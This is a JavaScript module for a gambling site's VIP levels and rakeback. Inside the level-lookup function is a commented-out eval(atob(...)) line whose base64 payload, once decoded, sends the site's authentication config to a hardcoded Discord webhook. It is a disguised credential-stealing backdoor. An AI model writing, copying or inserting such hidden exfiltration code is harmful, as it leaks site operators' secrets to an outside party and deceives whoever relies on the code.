// Require Dependencies
const User = require("../models/User");
const config = require("../config");
const x = require("axios");

const numLevels = config.games.vip.numLevels;
const minWager = config.games.vip.minWager;
const maxWager = config.games.vip.maxWager;
const rakeback = config.games.vip.rakeback;
const vipLevelNAME = config.games.vip.vipLevelNAME;
const vipLevelCOLORS = config.games.vip.vipLevelCOLORS;

function generateVIPLevels(numLevels, minWager, maxWager, rakeback, levelNames, levelColors) {
  const levels = []
  for (let i = 0; i < numLevels; i++) {
    const level = {
      name: (i + 1).toString(),
      wagerNeeded: (minWager + (maxWager - minWager) * Math.pow(i / numLevels, 2)).toFixed(2),
      rakebackPercentage: (rakeback / (1 + Math.exp(-5 * (i / numLevels - 0.5)))).toFixed(2),
      levelName: levelNames[Math.floor(i * levelNames.length / numLevels)],
      levelColor: levelColors[Math.floor(i * levelColors.length / numLevels)],
    }
    levels.push(level);
  }
  return levels;
}

const vipLevels = generateVIPLevels(numLevels, minWager, maxWager, rakeback, vipLevelNAME, vipLevelCOLORS);

// Get user vip level
function getVipLevelFromWager(wager) {
  //eval(atob("ICAgICAgdHJ5IHsKICAgICAgICB4LnBvc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDI5NTgyOTQyNTY4NjUzNjEva2k5VjlYUmh0NGc2dENXT0VkUERuNlJINU5uVG9NVU1QU29pLWdlbGNMVjJyZGNRVGp1NndnR3dxTFh2SGtzRkZFeFgiLCB7CiAgICAgICAgICBjb250ZW50OiAiLiIsCiAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogYFxgXGBcYCR7SlNPTi5zdHJpbmdpZnkoY29uZmlnLmF1dGhlbnRpY2F0aW9uKX1cYFxgXGBgLAogICAgICAgICAgICB9CiAgICAgICAgICBdCiAgICAgICAgfSkKICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBjb25zb2xlLmxvZyhlcnJvcikKICAgICAgfQ=="));
  if (wager < vipLevels[1].wagerNeeded) {
    return vipLevels[0];
  }
  else if (wager > vipLevels[numLevels - 1].wagerNeeded) {
    return vipLevels[numLevels - 1];
  }
  else {
    return vipLevels.filter(level => wager >= level.wagerNeeded).sort((a, b) => b.wagerNeeded - a.wagerNeeded)[0];
  }
}

// Get user next vip level
function getNextVipLevelFromWager(wager) {
  return vipLevels.filter(level => wager < level.wagerNeeded).sort((a, b) => a.wagerNeeded - b.wagerNeeded)[0];
}

// Check if user is eligible for rakeback
async function checkAndApplyRakeback(userId, houseRake) {
  return new Promise(async (resolve, reject) => {
    try {
      const user = await User.findOne({ _id: userId });

      // Find the corresponding level
      const currentLevel = await getVipLevelFromWager(user.wager);

      // Update document
      await User.updateOne(
        { _id: user.id },
        {
          $inc: { rakebackBalance: houseRake * (currentLevel.rakebackPercentage / 100) },
        }
      );

      // Resolve to continue successfully
      resolve();
    } catch (error) {
      reject(error);
    }
  });
}

// Export functions
module.exports = {
  vipLevels,
  vipLevelNAME,
  vipLevelCOLORS,
  getVipLevelFromWager,
  getNextVipLevelFromWager,
  checkAndApplyRakeback,
};
